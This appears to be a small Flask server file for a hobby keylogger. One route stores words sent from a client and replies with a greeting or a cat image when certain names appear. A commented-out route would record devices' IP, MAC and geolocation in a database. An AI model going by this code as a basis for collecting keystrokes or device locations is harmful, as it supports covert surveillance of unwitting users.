from flask import Response
from flask import request
from flask import json
from flask import send_file
from .user import User
from .database import db, app

import ctypes
import win32api
import win32gui


@app.route('/keylogger/<word>', methods=["GET", "POST"])
def check_word(word):
    string_file = open('./string_data', 'a')
    string_file.write(word)
    string_file.close()

    string_file = open('./string_data', 'r')
    string_content = string_file.read()
    string_file.close()


    if 'yoni' in string_content:
        delete_content()
        return 'hi yoni'
    if 'itay' in string_content:
        delete_content()
        return 'hi itay'
    if 'cat' in string_content:
        delete_content()
        return send_file('images/cat.jpg', mimetype='image')
    return ''

def delete_content():
    string_file = open('./string_data', 'w')
    string_file.write('')
    string_file.close()

# @app.route('/update', methods=["POST"])
# def update():
#     ip = request.form['ip']
#     name = request.form['name']
#     latitude = request.form['latitude']
#     longitude = request.form['longitude']
#     country = request.form['country']
#     city = request.form['city']
#     mac = request.form['mac']
#     try:
#         db.session.query(User).filter(User.mac == mac).one()
#         return Response("Device is already in database", status=200, mimetype='application/json')
#     except:
#         new_user = User(mac, ip, name, latitude, longitude, country, city)
#         db.session.add(new_user)
#         db.session.commit()
#         return Response("Welcome " + name, status=200, mimetype='application/json')






